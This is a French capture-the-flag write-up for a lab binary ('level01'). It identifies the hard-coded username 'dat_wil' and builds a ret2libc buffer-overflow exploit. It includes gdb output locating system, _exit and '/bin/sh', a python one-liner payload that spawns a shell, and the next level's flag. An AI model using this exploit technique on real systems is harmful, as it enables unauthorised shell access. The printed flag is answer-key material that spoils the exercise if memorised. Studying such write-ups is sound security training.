## GET Flag

Le binaire est composé de 3 fonctions : `main`, `verify_user_name`, `verify_user_pass`

Dans `verify_user_name` il réalise un `strncmp` avec `dat_wil` et l'entrée utilisateur.
Dans `verify_user_pass` il réalise un `strncmp` avec `admin` et l'entrée utilisateur, mais dans tous les cas, il met "nope, incorrect password...".

Il est donc possible de faire un buffer overflow avec une attaque `ret2libc`.

Il nous faut donc de récupérer l'adresse de `_exit`, `system` et `/bin/sh`

```
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
gdb-peda$ p _exit
$2 = {<text variable, no debug info>} 0xf7ee45c4 <_exit>
gdb-peda$ searchmem "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f897ec ("/bin/sh")
```

Il est donc possible de mettre ces adresses aux bons endroits : `python -c 'print "dat_wil" + "\n" + "" + 80 * "A" + "\xd0\xae\xe6\xf7"  + "\xc4\x45\xee\xf7" + "\xec\x97\xf8\xf7"' > /tmp/level01`
Pour le mot de passe nous allons écrire `80 A` suivit de l'adresse de `system` puis de `_exit` et de `"/bin/sh"`

Il va donc executer `system`, mettre "/bin/sh" en params puis jump sur `_exit` lorsque le shell va quitter (éviter le segfault).

### Flag

```
level02
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
